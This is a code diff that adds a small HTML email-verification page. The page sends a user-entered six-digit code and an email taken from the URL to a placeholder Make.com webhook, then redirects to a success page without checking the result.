@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verify</title>
+</head>
+
+<body>
+
+<h2>Enter Code</h2>
+
+<input id="code" placeholder="6-digit code">
+<button onclick="verify()">Verify</button>
+
+<script>
+const WEBHOOK_VERIFY = "https://hook.eu1.make.com/YOUR_VERIFY";
+
+const email = new URLSearchParams(window.location.search).get("email");
+
+function verify() {
+  const code = document.getElementById("code").value;
+
+  fetch(WEBHOOK_VERIFY + `?email=${email}&code=${code}`);
+
+  alert("Checking...");
+  window.location.href = "success.html";
+}
+</script>
+
+</body>
+</html>
